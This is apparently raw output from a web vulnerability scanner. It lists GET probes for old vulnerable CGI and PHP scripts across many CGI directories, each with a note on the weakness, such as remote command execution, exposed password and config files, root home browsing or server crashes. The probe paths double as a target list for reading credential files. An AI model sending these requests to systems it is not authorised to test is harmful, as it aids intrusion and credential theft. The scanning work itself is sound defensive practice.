++ GET /mpcgi/finger.pl: /mpcgi/finger.pl: finger other users, may be other commands?
++ GET /cgi-bin/finger.pl: /cgi-bin/finger.pl: finger other users, may be other commands?
++ GET /ows-bin/finger.pl: /ows-bin/finger.pl: finger other users, may be other commands?
++ GET /cgi-sys/finger.pl: /cgi-sys/finger.pl: finger other users, may be other commands?
++ GET /cgi-local/finger.pl: /cgi-local/finger.pl: finger other users, may be other commands?
++ GET /htbin/finger.pl: /htbin/finger.pl: finger other users, may be other commands?
++ GET /cgibin/finger.pl: /cgibin/finger.pl: finger other users, may be other commands?
++ GET /cgis/finger.pl: /cgis/finger.pl: finger other users, may be other commands?
++ GET /scripts/finger.pl: /scripts/finger.pl: finger other users, may be other commands?
++ GET /cgi-win/finger.pl: /cgi-win/finger.pl: finger other users, may be other commands?
++ GET /fcgi-bin/finger.pl: /fcgi-bin/finger.pl: finger other users, may be other commands?
++ GET /cgi-exe/finger.pl: /cgi-exe/finger.pl: finger other users, may be other commands?
++ GET /cgi-home/finger.pl: /cgi-home/finger.pl: finger other users, may be other commands?
++ GET /cgi-perl/finger.pl: /cgi-perl/finger.pl: finger other users, may be other commands?
++ GET /scgi-bin/finger.pl: /scgi-bin/finger.pl: finger other users, may be other commands?
++ GET /cgi.cgi/get32.exe: /cgi.cgi/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /webcgi/get32.exe: /webcgi/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-914/get32.exe: /cgi-914/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-915/get32.exe: /cgi-915/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /bin/get32.exe: /bin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi/get32.exe: /cgi/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /mpcgi/get32.exe: /mpcgi/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-bin/get32.exe: /cgi-bin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /ows-bin/get32.exe: /ows-bin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-sys/get32.exe: /cgi-sys/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-local/get32.exe: /cgi-local/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /htbin/get32.exe: /htbin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgibin/get32.exe: /cgibin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgis/get32.exe: /cgis/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /scripts/get32.exe: /scripts/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-win/get32.exe: /cgi-win/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /fcgi-bin/get32.exe: /fcgi-bin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-exe/get32.exe: /cgi-exe/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-home/get32.exe: /cgi-home/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi-perl/get32.exe: /cgi-perl/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /scgi-bin/get32.exe: /scgi-bin/get32.exe: This can allow attackers to execute arbitrary commands remotely.
++ GET /cgi.cgi/gm-authors.cgi: /cgi.cgi/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /webcgi/gm-authors.cgi: /webcgi/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-914/gm-authors.cgi: /cgi-914/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-915/gm-authors.cgi: /cgi-915/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /bin/gm-authors.cgi: /bin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi/gm-authors.cgi: /cgi/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /mpcgi/gm-authors.cgi: /mpcgi/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-bin/gm-authors.cgi: /cgi-bin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /ows-bin/gm-authors.cgi: /ows-bin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-sys/gm-authors.cgi: /cgi-sys/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-local/gm-authors.cgi: /cgi-local/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /htbin/gm-authors.cgi: /htbin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgibin/gm-authors.cgi: /cgibin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgis/gm-authors.cgi: /cgis/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /scripts/gm-authors.cgi: /scripts/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-win/gm-authors.cgi: /cgi-win/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /fcgi-bin/gm-authors.cgi: /fcgi-bin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-exe/gm-authors.cgi: /cgi-exe/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-home/gm-authors.cgi: /cgi-home/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi-perl/gm-authors.cgi: /cgi-perl/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /scgi-bin/gm-authors.cgi: /scgi-bin/gm-authors.cgi: GreyMatter 'password' file, that controls who can post. This contains login and password information and is installed mode 666 by default. See http://www.attrition.org/~jericho/works/security/greymatter.html for more info.
++ GET /cgi.cgi/guestbook/passwd: /cgi.cgi/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /webcgi/guestbook/passwd: /webcgi/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-914/guestbook/passwd: /cgi-914/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-915/guestbook/passwd: /cgi-915/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /bin/guestbook/passwd: /bin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi/guestbook/passwd: /cgi/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /mpcgi/guestbook/passwd: /mpcgi/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-bin/guestbook/passwd: /cgi-bin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /ows-bin/guestbook/passwd: /ows-bin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-sys/guestbook/passwd: /cgi-sys/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-local/guestbook/passwd: /cgi-local/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /htbin/guestbook/passwd: /htbin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgibin/guestbook/passwd: /cgibin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgis/guestbook/passwd: /cgis/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /scripts/guestbook/passwd: /scripts/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-win/guestbook/passwd: /cgi-win/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /fcgi-bin/guestbook/passwd: /fcgi-bin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-exe/guestbook/passwd: /cgi-exe/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-home/guestbook/passwd: /cgi-home/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi-perl/guestbook/passwd: /cgi-perl/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /scgi-bin/guestbook/passwd: /scgi-bin/guestbook/passwd: GuestBook r4 from lasource.r2.ru stores the admin password in a plain text file.
++ GET /cgi.cgi/photo/protected/manage.cgi: /cgi.cgi/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /webcgi/photo/protected/manage.cgi: /webcgi/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-914/photo/protected/manage.cgi: /cgi-914/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-915/photo/protected/manage.cgi: /cgi-915/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /bin/photo/protected/manage.cgi: /bin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi/photo/protected/manage.cgi: /cgi/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /mpcgi/photo/protected/manage.cgi: /mpcgi/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-bin/photo/protected/manage.cgi: /cgi-bin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /ows-bin/photo/protected/manage.cgi: /ows-bin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-sys/photo/protected/manage.cgi: /cgi-sys/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-local/photo/protected/manage.cgi: /cgi-local/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /htbin/photo/protected/manage.cgi: /htbin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgibin/photo/protected/manage.cgi: /cgibin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgis/photo/protected/manage.cgi: /cgis/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /scripts/photo/protected/manage.cgi: /scripts/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-win/photo/protected/manage.cgi: /cgi-win/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /fcgi-bin/photo/protected/manage.cgi: /fcgi-bin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-exe/photo/protected/manage.cgi: /cgi-exe/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-home/photo/protected/manage.cgi: /cgi-home/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi-perl/photo/protected/manage.cgi: /cgi-perl/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /scgi-bin/photo/protected/manage.cgi: /scgi-bin/photo/protected/manage.cgi: My Photo Gallery management interface. May allow full access to photo galleries and more. Versions before 3.8 allowed anyone to view contents of any directory on systems.
++ GET /cgi.cgi/wrap.cgi: /cgi.cgi/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /webcgi/wrap.cgi: /webcgi/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-914/wrap.cgi: /cgi-914/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-915/wrap.cgi: /cgi-915/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /bin/wrap.cgi: /bin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi/wrap.cgi: /cgi/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /mpcgi/wrap.cgi: /mpcgi/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-bin/wrap.cgi: /cgi-bin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /ows-bin/wrap.cgi: /ows-bin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-sys/wrap.cgi: /cgi-sys/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-local/wrap.cgi: /cgi-local/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /htbin/wrap.cgi: /htbin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgibin/wrap.cgi: /cgibin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgis/wrap.cgi: /cgis/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /scripts/wrap.cgi: /scripts/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-win/wrap.cgi: /cgi-win/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /fcgi-bin/wrap.cgi: /fcgi-bin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-exe/wrap.cgi: /cgi-exe/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-home/wrap.cgi: /cgi-home/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /cgi-perl/wrap.cgi: /cgi-perl/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ GET /scgi-bin/wrap.cgi: /scgi-bin/wrap.cgi: possible variation: comes with IRIX 6.2; allows to view directories
++ -637: GET /~root/: /~root/: Allowed to browse root's home directory.
++ GET /cgi-bin/wrap: /cgi-bin/wrap: comes with IRIX 6.2; allows to view directories
++ GET /forums//admin/config.php: /forums//admin/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums//adm/config.php: /forums//adm/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums//administrator/config.php: /forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
++ GET /forums/config.php: /forums/config.php: PHP Config file may contain database IDs and passwords.
++ GET /guestbook/guestbookdat: /guestbook/guestbookdat: PHP-Gastebuch 1.60 Beta reveals sensitive information about its configuration.
++ GET /guestbook/pwd: /guestbook/pwd: PHP-Gastebuch 1.60 Beta reveals the md5 hash of the admin password.
++ GET /help/: /help/: Help directory should not be accessible
++ -2411: GET /hola/admin/cms/htmltags.php?datei=./sec/data.php: /hola/admin/cms/htmltags.php?datei=./sec/data.php: hola-cms-1.2.9-10 may reveal the administrator ID and password.
++ -8103: GET /global.inc: /global.inc: PHP-Survey's include file should not be available via the web. Configure the web server to ignore .inc files or change this to global.inc.php
++ GET /cgi.cgi/formmail.pl: /cgi.cgi/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /webcgi/formmail.pl: /webcgi/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-914/formmail.pl: /cgi-914/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-915/formmail.pl: /cgi-915/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /bin/formmail.pl: /bin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi/formmail.pl: /cgi/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /mpcgi/formmail.pl: /mpcgi/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-bin/formmail.pl: /cgi-bin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /ows-bin/formmail.pl: /ows-bin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-sys/formmail.pl: /cgi-sys/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-local/formmail.pl: /cgi-local/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /htbin/formmail.pl: /htbin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgibin/formmail.pl: /cgibin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgis/formmail.pl: /cgis/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /scripts/formmail.pl: /scripts/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-win/formmail.pl: /cgi-win/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /fcgi-bin/formmail.pl: /fcgi-bin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-exe/formmail.pl: /cgi-exe/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-home/formmail.pl: /cgi-home/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /cgi-perl/formmail.pl: /cgi-perl/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ GET /scgi-bin/formmail.pl: /scgi-bin/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ -59620: GET /inc/common.load.php: /inc/common.load.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ -59619: GET /inc/config.php: /inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ -59618: GET /inc/dbase.php: /inc/dbase.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
++ GET /cgi.cgi/visadmin.exe: /cgi.cgi/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /webcgi/visadmin.exe: /webcgi/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-914/visadmin.exe: /cgi-914/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-915/visadmin.exe: /cgi-915/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /bin/visadmin.exe: /bin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi/visadmin.exe: /cgi/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /mpcgi/visadmin.exe: /mpcgi/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-bin/visadmin.exe: /cgi-bin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /ows-bin/visadmin.exe: /ows-bin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-sys/visadmin.exe: /cgi-sys/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-local/visadmin.exe: /cgi-local/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /htbin/visadmin.exe: /htbin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgibin/visadmin.exe: /cgibin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgis/visadmin.exe: /cgis/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /scripts/visadmin.exe: /scripts/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-win/visadmin.exe: /cgi-win/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /fcgi-bin/visadmin.exe: /fcgi-bin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-exe/visadmin.exe: /cgi-exe/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-home/visadmin.exe: /cgi-home/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi-perl/visadmin.exe: /cgi-perl/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /scgi-bin/visadmin.exe: /scgi-bin/visadmin.exe: This CGI allows an attacker to crash the web server. Remove it from the CGI directory.
++ GET /cgi.cgi/html2chtml.cgi: /cgi.cgi/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /webcgi/html2chtml.cgi: /webcgi/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-914/html2chtml.cgi: /cgi-914/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-915/html2chtml.cgi: /cgi-915/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /bin/html2chtml.cgi: /bin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi/html2chtml.cgi: /cgi/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /mpcgi/html2chtml.cgi: /mpcgi/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-bin/html2chtml.cgi: /cgi-bin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /ows-bin/html2chtml.cgi: /ows-bin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-sys/html2chtml.cgi: /cgi-sys/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-local/html2chtml.cgi: /cgi-local/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /htbin/html2chtml.cgi: /htbin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgibin/html2chtml.cgi: /cgibin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgis/html2chtml.cgi: /cgis/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /scripts/html2chtml.cgi: /scripts/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-win/html2chtml.cgi: /cgi-win/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /fcgi-bin/html2chtml.cgi: /fcgi-bin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-exe/html2chtml.cgi: /cgi-exe/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-home/html2chtml.cgi: /cgi-home/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-perl/html2chtml.cgi: /cgi-perl/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /scgi-bin/html2chtml.cgi: /scgi-bin/html2chtml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi.cgi/html2wml.cgi: /cgi.cgi/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /webcgi/html2wml.cgi: /webcgi/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-914/html2wml.cgi: /cgi-914/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-915/html2wml.cgi: /cgi-915/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /bin/html2wml.cgi: /bin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi/html2wml.cgi: /cgi/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /mpcgi/html2wml.cgi: /mpcgi/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-bin/html2wml.cgi: /cgi-bin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /ows-bin/html2wml.cgi: /ows-bin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-sys/html2wml.cgi: /cgi-sys/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-local/html2wml.cgi: /cgi-local/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /htbin/html2wml.cgi: /htbin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgibin/html2wml.cgi: /cgibin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgis/html2wml.cgi: /cgis/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /scripts/html2wml.cgi: /scripts/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /cgi-win/html2wml.cgi: /cgi-win/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
++ GET /fcgi-bin/html2wml.cgi: /fcgi-bin/html2wml.cgi: Html2Wml < 0.4.8 access local files via CGI, and more
